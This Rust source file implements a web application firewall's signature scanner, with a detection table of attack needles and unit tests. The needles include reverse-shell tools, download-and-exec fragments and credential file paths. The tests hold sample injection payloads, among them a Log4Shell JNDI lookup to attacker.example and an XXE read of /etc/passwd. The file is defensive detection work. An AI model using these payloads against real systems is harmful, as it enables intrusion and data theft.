//! Lane 1 signature scanning (Aho-Corasick).
//!
//! The scanner answers one question cheaply: does any known high-confidence
//! attack shape appear in the canonical request? It complements
//! [`super::RawPathTraversalDetector`] (which inspects raw-path structure)
//! and runs before any semantic parsing (mandate §8).
//!
//! # Design
//!
//! - One [`AhoCorasick`] automaton over every needle, ASCII
//!   case-insensitive, `LeftmostLongest` (a longer signature at the same
//!   position wins — e.g. `${jndi:` over `${`).
//! - Each signature carries its own category, severity, confidence, action
//!   hint and score tier. A match emits **one** finding per signature per
//!   request (first hit wins), so a payload repeated across query and body
//!   does not amplify its score.
//! - Scan targets: canonical path, query names/values, cookie values, and
//!   the body (UTF-8 only, bounded by the detection budget). Header values
//!   arrive in a later slice together with the context demotion rules the
//!   legacy engine applies to `Referer`/`User-Agent`.
//! - The starter table below is deliberately small and tiered:
//!   `Block`-tier needles are payload shapes (never plain words);
//!   ambiguous tokens (`<script`, `union select`, `information_schema`) are
//!   `Log`-tier weak signals and must not block on their own (mandate §9).
//!   Every addition to the table arrives with corpus cases.

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};

use super::super::{
    Action, AttackCategory, Confidence, Detector, DetectorId, DetectorResult,
    EvidenceSource, Finding, Severity,
};

use crate::canonical::CanonicalRequest;

/// One signature: identity, metadata and the literal needles that trigger it.
#[derive(Debug, Clone, Copy)]
pub struct SignatureSpec {
    /// Stable rule id (also used as the [`Finding`] rule id).
    pub id: &'static str,
    pub category: AttackCategory,
    pub severity: Severity,
    pub confidence: Confidence,
    /// Action suggested when the signature fires. The pipeline escalates;
    /// policy may still downgrade to monitor.
    pub action: Action,
    /// Literal needles, matched ASCII case-insensitively.
    pub needles: &'static [&'static str],
}

/// Anomaly points contributed by a signature, by severity.
pub const fn score_for(severity: Severity) -> u32 {
    match severity {
        Severity::Info => 0,
        Severity::Low => 5,
        Severity::Medium => 15,
        Severity::High => 30,
        Severity::Critical => 50,
    }
}

/// Starter signature table (Phase 4, first slice).
///
/// `Block`-tier entries are syntax shapes, not words. `Log`-tier entries are
/// ambiguous tokens that occur in documentation and normal traffic; they feed
/// scoring and shadow statistics but never block.
pub static STARTER_SIGNATURES: &[SignatureSpec] = &[
    // ── SQL injection ───────────────────────────────────────────────────
    SignatureSpec {
        id: "sig.sqli.union_select",
        category: AttackCategory::SqlInjection,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &[
            "union select null",
            "union all select null",
            "union/**/select",
            "union%20select",
        ],
    },
    SignatureSpec {
        id: "sig.sqli.tautology",
        category: AttackCategory::SqlInjection,
        severity: Severity::Critical,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["' or '1'='1", "or 1=1--", "or 1=1#", "' or 1=1--"],
    },
    SignatureSpec {
        id: "sig.sqli.waitfor",
        category: AttackCategory::SqlInjection,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["waitfor delay", ";waitfor delay"],
    },
    SignatureSpec {
        id: "sig.sqli.file_io",
        category: AttackCategory::SqlInjection,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["into outfile", "into dumpfile"],
    },
    SignatureSpec {
        id: "sig.sqli.xp_cmdshell",
        category: AttackCategory::SqlInjection,
        severity: Severity::Critical,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["xp_cmdshell"],
    },
    SignatureSpec {
        id: "sig.sqli.union_bare",
        category: AttackCategory::SqlInjection,
        severity: Severity::Low,
        confidence: Confidence::Low,
        action: Action::Log,
        needles: &["union select", "union all select"],
    },
    SignatureSpec {
        id: "sig.sqli.introspection",
        category: AttackCategory::SqlInjection,
        severity: Severity::Low,
        confidence: Confidence::Low,
        action: Action::Log,
        needles: &["information_schema.tables", "information_schema.columns"],
    },
    SignatureSpec {
        id: "sig.sqli.time_functions",
        category: AttackCategory::SqlInjection,
        severity: Severity::Low,
        confidence: Confidence::Low,
        action: Action::Log,
        needles: &["sleep(", "benchmark("],
    },
    // ── XSS ─────────────────────────────────────────────────────────────
    SignatureSpec {
        id: "sig.xss.script_call",
        category: AttackCategory::Xss,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &[
            "<script>alert",
            "<script>confirm",
            "<script>prompt",
            "<script>document.",
        ],
    },
    SignatureSpec {
        id: "sig.xss.handler_call",
        category: AttackCategory::Xss,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &[
            "onerror=alert",
            "onerror=eval",
            "onload=alert",
            "onload=eval",
            "onerror=prompt",
        ],
    },
    SignatureSpec {
        id: "sig.xss.svg_onload",
        category: AttackCategory::Xss,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["<svg/onload", "<svg onload"],
    },
    SignatureSpec {
        id: "sig.xss.iframe_js",
        category: AttackCategory::Xss,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["<iframe src=\"javascript:", "<iframe src=javascript:"],
    },
    SignatureSpec {
        id: "sig.xss.script_tag",
        category: AttackCategory::Xss,
        severity: Severity::Low,
        confidence: Confidence::Low,
        action: Action::Log,
        needles: &["<script", "</script>"],
    },
    SignatureSpec {
        id: "sig.xss.js_uri",
        category: AttackCategory::Xss,
        severity: Severity::Low,
        confidence: Confidence::Low,
        action: Action::Log,
        needles: &["javascript:"],
    },
    // ── Command injection ───────────────────────────────────────────────
    SignatureSpec {
        id: "sig.rce.shell_binaries",
        category: AttackCategory::CommandInjection,
        severity: Severity::Critical,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &[
            "/bin/sh",
            "/bin/bash",
            "cmd.exe /c",
            "powershell -e",
            "powershell.exe -",
            "bash -i",
        ],
    },
    SignatureSpec {
        id: "sig.rce.reverse_shell",
        category: AttackCategory::CommandInjection,
        severity: Severity::Critical,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["nc -e", "ncat -e", "/dev/tcp/"],
    },
    SignatureSpec {
        id: "sig.rce.download_exec",
        category: AttackCategory::CommandInjection,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &[";wget http", ";curl http", "&& wget http", "&& curl http"],
    },
    // ── Traversal / file inclusion ──────────────────────────────────────
    SignatureSpec {
        id: "sig.lfi.target_files",
        category: AttackCategory::PathTraversal,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["/etc/passwd", "/etc/shadow", "win.ini", "boot.ini"],
    },
    SignatureSpec {
        id: "sig.lfi.php_wrappers",
        category: AttackCategory::LfiRfi,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &[
            "php://filter",
            "php://input",
            "expect://",
            "data://text/plain",
        ],
    },
    SignatureSpec {
        id: "sig.traversal.dots",
        category: AttackCategory::PathTraversal,
        severity: Severity::Low,
        confidence: Confidence::Low,
        action: Action::Log,
        needles: &["../", "..\\"],
    },
    // ── Log4Shell / JNDI ────────────────────────────────────────────────
    SignatureSpec {
        id: "sig.log4shell.jndi",
        category: AttackCategory::Log4Shell,
        severity: Severity::Critical,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["${jndi:", "${${lower:", "${jndi:ldap", "${jndi:rmi"],
    },
    // ── SSRF ────────────────────────────────────────────────────────────
    SignatureSpec {
        id: "sig.ssrf.metadata",
        category: AttackCategory::Ssrf,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &[
            "169.254.169.254",
            "metadata.google.internal",
            "100.100.100.200",
        ],
    },
    // ── XXE ─────────────────────────────────────────────────────────────
    SignatureSpec {
        id: "sig.xxe.external_system",
        category: AttackCategory::Xxe,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["system \"file://", "system 'file://"],
    },
    SignatureSpec {
        id: "sig.xxe.entity_decl",
        category: AttackCategory::Xxe,
        severity: Severity::Low,
        confidence: Confidence::Low,
        action: Action::Log,
        needles: &["<!entity"],
    },
    // ── Deserialization ─────────────────────────────────────────────────
    SignatureSpec {
        id: "sig.deser.java_serialized",
        category: AttackCategory::Deserialization,
        severity: Severity::Critical,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &["ro0ab", "aced0005"],
    },
    SignatureSpec {
        id: "sig.deser.java_gadgets",
        category: AttackCategory::Deserialization,
        severity: Severity::Critical,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &[
            "org.apache.commons.collections.functors",
            "com.sun.org.apache.xalan.internal.xsltc.trax.templatesimpl",
        ],
    },
    // ── SSTI ────────────────────────────────────────────────────────────
    SignatureSpec {
        id: "sig.ssti.probe",
        category: AttackCategory::Ssti,
        severity: Severity::Low,
        confidence: Confidence::Low,
        action: Action::Log,
        needles: &["{{7*7}}", "${7*7}"],
    },
    // ── CRLF / header injection ─────────────────────────────────────────
    SignatureSpec {
        id: "sig.crlf.injected_header",
        category: AttackCategory::CrlfInjection,
        severity: Severity::High,
        confidence: Confidence::High,
        action: Action::Block,
        needles: &[
            "\r\nset-cookie:",
            "\r\nlocation:",
            "\r\ncontent-length:",
            "\r\nx-forwarded-for:",
        ],
    },
    SignatureSpec {
        id: "sig.crlf.encoded_tail",
        category: AttackCategory::CrlfInjection,
        severity: Severity::Low,
        confidence: Confidence::Low,
        action: Action::Log,
        needles: &["%0d%0a"],
    },
    // ── Prototype pollution ─────────────────────────────────────────────
    SignatureSpec {
        id: "sig.proto.pollution",
        category: AttackCategory::PrototypePollution,
        severity: Severity::Low,
        confidence: Confidence::Low,
        action: Action::Log,
        needles: &["__proto__", "constructor.prototype"],
    },
];

/// Aho-Corasick scanner over a signature table.
pub struct SignatureDetector {
    automaton: Option<AhoCorasick>,
    specs: &'static [SignatureSpec],
    /// Needle index → signature index.
    signature_of_needle: Vec<usize>,
}

impl SignatureDetector {
    /// Scanner with the [`STARTER_SIGNATURES`] table.
    pub fn new() -> Self {
        Self::with_specs(STARTER_SIGNATURES)
    }

    /// Scanner over a custom static table (tests, future site-specific sets).
    pub fn with_specs(specs: &'static [SignatureSpec]) -> Self {
        let mut needles: Vec<&str> = Vec::new();
        let mut signature_of_needle = Vec::new();
        for (index, spec) in specs.iter().enumerate() {
            for needle in spec.needles {
                needles.push(*needle);
                signature_of_needle.push(index);
            }
        }
        let automaton = AhoCorasickBuilder::new()
            .ascii_case_insensitive(true)
            // `Standard` match semantics are required for overlapping
            // iteration; our needles have no prefix-overlap where
            // leftmost-longest would matter.
            .match_kind(MatchKind::Standard)
            .build(&needles)
            .ok();
        Self {
            automaton,
            specs,
            signature_of_needle,
        }
    }

    pub fn signature_count(&self) -> usize {
        self.specs.len()
    }
}

impl Default for SignatureDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for SignatureDetector {
    fn id(&self) -> DetectorId {
        DetectorId("fast.signatures")
    }

    fn inspect(
        &self,
        request: &CanonicalRequest,
        ctx: &mut super::super::DetectionContext,
    ) -> DetectorResult {
        let Some(automaton) = &self.automaton else {
            return DetectorResult::degraded("signature automaton unavailable");
        };

        let mut seen = vec![false; self.specs.len()];
        let mut findings: Vec<Finding> = Vec::new();
        let mut degraded = None;

        // Collect matches for one value; one finding per signature (first
        // hit wins) keeps repeated payloads from amplifying their score.
        // Overlapping iteration matters: in `../../etc/passwd` the `../`
        // needle would otherwise consume the slash that `/etc/passwd`
        // needs, hiding the more severe signature behind a weaker one.
        let scan = |value: &str,
                    source: EvidenceSource,
                    field: Option<&str>,
                    findings: &mut Vec<Finding>,
                    seen: &mut [bool]| {
            for hit in automaton.find_overlapping_iter(value) {
                let index = self.signature_of_needle[hit.pattern().as_usize()];
                if seen[index] {
                    continue;
                }
                seen[index] = true;
                let spec = &self.specs[index];
                let mut finding = Finding::new(
                    DetectorId("fast.signatures"),
                    spec.id,
                    spec.category,
                )
                .confidence(spec.confidence)
                .severity(spec.severity)
                .score(score_for(spec.severity))
                .action(spec.action)
                .source(source)
                .detail(format!("signature {} matched", spec.id));
                if let Some(field) = field {
                    finding = finding.field(field.to_string());
                }
                findings.push(finding);
            }
        };

        scan(
            request.path(),
            EvidenceSource::Path,
            None,
            &mut findings,
            &mut seen,
        );
        for param in request.query() {
            scan(
                &param.name,
                EvidenceSource::Query,
                Some(&param.name),
                &mut findings,
                &mut seen,
            );
            scan(
                &param.value,
                EvidenceSource::Query,
                Some(&param.name),
                &mut findings,
                &mut seen,
            );
        }
        for (name, value) in request.cookies() {
            scan(
                name,
                EvidenceSource::Cookie,
                Some(name),
                &mut findings,
                &mut seen,
            );
            scan(
                value,
                EvidenceSource::Cookie,
                Some(name),
                &mut findings,
                &mut seen,
            );
        }
        // Cookie parsing splits on `;` and `=`, which can itself break an
        // attack string apart (`abc'; or 1=1--` becomes two harmless pairs).
        // Scanning the raw header as well closes that bypass; the `seen` set
        // keeps it from double-counting signatures already found above.
        for value in request.headers_all("cookie") {
            scan(
                value,
                EvidenceSource::Cookie,
                Some("cookie"),
                &mut findings,
                &mut seen,
            );
        }
        if let Some(body) = request.body() {
            let limit = ctx.budget().max_body_bytes.min(body.len());
            match std::str::from_utf8(&body[..limit]) {
                Ok(text) => {
                    scan(
                        text,
                        EvidenceSource::Body,
                        None,
                        &mut findings,
                        &mut seen,
                    );
                    if body.len() > limit {
                        degraded = Some("body scan truncated at budget");
                    }
                },
                Err(_) => {
                    // Binary bodies need the structured extraction phase;
                    // until then the scanner reports that it looked away.
                    degraded = Some("body is not valid utf-8");
                },
            }
        }

        DetectorResult { findings, degraded }
    }
}

#[cfg(test)]
mod tests {
    use super::{score_for, SignatureDetector, STARTER_SIGNATURES};
    use crate::canonical::{Canonicalizer, RequestParts};
    use crate::pipeline::{
        Action, AttackCategory, DetectionContext, Detector, Severity,
    };

    fn inspect(target: &str) -> crate::pipeline::DetectorResult {
        let request = Canonicalizer::default().canonicalize(RequestParts::new(
            "GET",
            "example.com",
            target,
        ));
        let detector = SignatureDetector::new();
        let mut ctx = DetectionContext::new();
        detector.inspect(&request, &mut ctx)
    }

    fn query(payload: &str) -> crate::pipeline::DetectorResult {
        // Encode only the characters a client would encode; the
        // canonicalizer decodes them again before scanning.
        let encoded = payload
            .replace('%', "%25")
            .replace(' ', "%20")
            .replace('\r', "%0D")
            .replace('\n', "%0A");
        inspect(&format!("/?q={encoded}"))
    }

    #[test]
    fn starter_table_compiles_and_has_unique_ids() {
        let detector = SignatureDetector::new();
        assert!(detector.automaton.is_some());
        assert_eq!(detector.signature_count(), STARTER_SIGNATURES.len());
        let mut ids: Vec<&str> =
            STARTER_SIGNATURES.iter().map(|s| s.id).collect();
        ids.sort_unstable();
        let count = ids.len();
        ids.dedup();
        assert_eq!(ids.len(), count, "duplicate signature ids");
    }

    #[test]
    fn block_tier_sqli_matches_case_insensitively() {
        let result = query("id=1 UNION SELECT NULL--");
        // Both the strong `union select null` signature and the weak bare
        // `union select` one fire; the strong one carries the Block hint.
        let strong: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.rule_id == "sig.sqli.union_select")
            .collect();
        assert_eq!(strong.len(), 1, "findings: {:?}", result.findings);
        let finding = strong[0];
        assert_eq!(finding.category, AttackCategory::SqlInjection);
        assert_eq!(finding.action_hint, Action::Block);
        assert_eq!(finding.score, score_for(Severity::High));
        // Weak sibling stays Log-tier.
        assert!(result
            .findings
            .iter()
            .filter(|f| f.rule_id == "sig.sqli.union_bare")
            .all(|f| f.action_hint == Action::Log));
    }

    #[test]
    fn tautology_in_cookie_matches() {
        let request = Canonicalizer::default().canonicalize(
            RequestParts::new("GET", "example.com", "/")
                .with_header("Cookie", "session=abc'; or 1=1--"),
        );
        let detector = SignatureDetector::new();
        let mut ctx = DetectionContext::new();
        let result = detector.inspect(&request, &mut ctx);
        assert_eq!(result.findings.len(), 1);
        assert_eq!(result.findings[0].category, AttackCategory::SqlInjection);
        assert_eq!(result.findings[0].action_hint, Action::Block);
    }

    #[test]
    fn weak_signals_never_block() {
        // Documentation prose: both the bare union and the introspection
        // names are weak signals only.
        let result = query(
            "doc=UNION SELECT merges rows; see information_schema.tables",
        );
        assert!(!result.findings.is_empty());
        assert!(
            result.findings.iter().all(|f| f.action_hint == Action::Log),
            "weak signatures must stay Log-tier: {:?}",
            result.findings
        );
    }

    #[test]
    fn one_finding_per_signature_across_multiple_values() {
        // Same payload in path, query and cookie: one finding, not three.
        let request = Canonicalizer::default().canonicalize(
            RequestParts::new(
                "GET",
                "example.com",
                "/etc/passwd?f=/etc/passwd",
            )
            .with_header("Cookie", "p=/etc/passwd"),
        );
        let detector = SignatureDetector::new();
        let mut ctx = DetectionContext::new();
        let result = detector.inspect(&request, &mut ctx);
        let hits: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.rule_id == "sig.lfi.target_files")
            .collect();
        assert_eq!(hits.len(), 1, "findings: {:?}", result.findings);
    }

    #[test]
    fn crlf_decoded_payload_blocks() {
        let result = query("next=%0D%0ASet-Cookie:%20session=evil");
        let crlf: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.category == AttackCategory::CrlfInjection)
            .collect();
        assert!(!crlf.is_empty());
        assert!(crlf.iter().any(|f| f.action_hint == Action::Block));
    }

    #[test]
    fn xxe_system_uri_blocks_and_entity_decl_is_weak() {
        let result = query(
            "xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        );
        let xxe: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.category == AttackCategory::Xxe)
            .collect();
        assert!(xxe.iter().any(|f| f.action_hint == Action::Block));
        assert!(xxe.iter().any(|f| f.rule_id == "sig.xxe.entity_decl"
            && f.action_hint == Action::Log));
    }

    #[test]
    fn java_serialized_body_marker_blocks() {
        let request = Canonicalizer::default().canonicalize(
            RequestParts::new("POST", "example.com", "/deserialize").with_body(
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==".as_bytes().to_vec(),
            ),
        );
        let detector = SignatureDetector::new();
        let mut ctx = DetectionContext::new();
        let result = detector.inspect(&request, &mut ctx);
        assert!(result
            .findings
            .iter()
            .any(|f| f.category == AttackCategory::Deserialization
                && f.action_hint == Action::Block));
    }

    #[test]
    fn log4shell_jndi_blocks() {
        let result = query("x=${jndi:ldap://attacker.example/a}");
        assert!(result
            .findings
            .iter()
            .any(|f| f.category == AttackCategory::Log4Shell
                && f.action_hint == Action::Block));
    }

    #[test]
    fn binary_body_degrades_without_findings() {
        let request = Canonicalizer::default().canonicalize(
            RequestParts::new("POST", "example.com", "/upload")
                .with_body(vec![0xff, 0xfe, 0x00, 0x01]),
        );
        let detector = SignatureDetector::new();
        let mut ctx = DetectionContext::new();
        let result = detector.inspect(&request, &mut ctx);
        assert!(result.findings.is_empty());
        assert_eq!(result.degraded, Some("body is not valid utf-8"));
    }
}
